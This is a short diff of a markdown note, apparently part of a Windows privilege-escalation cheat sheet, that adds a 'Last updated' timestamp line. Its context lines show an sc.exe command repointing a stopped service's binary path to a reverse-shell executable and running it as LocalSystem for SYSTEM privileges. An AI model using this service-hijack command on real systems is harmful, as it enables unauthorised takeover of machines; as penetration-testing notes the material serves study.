@@ -26,3 +26,6 @@ sc.exe query Stopped_Service
 sc.exe config Stopped_Service binpath= "C:\Reverse\Shell.exe" start= auto obj= "LocalSystem"
 # Setting obj to LocalSystem runs the service with SYSTEM Privilege
 ```
+
+
+Last updated: `$= dv.current().file.mtime.toFormat("MMMM dd, yyyy 'at' HH:mm")`
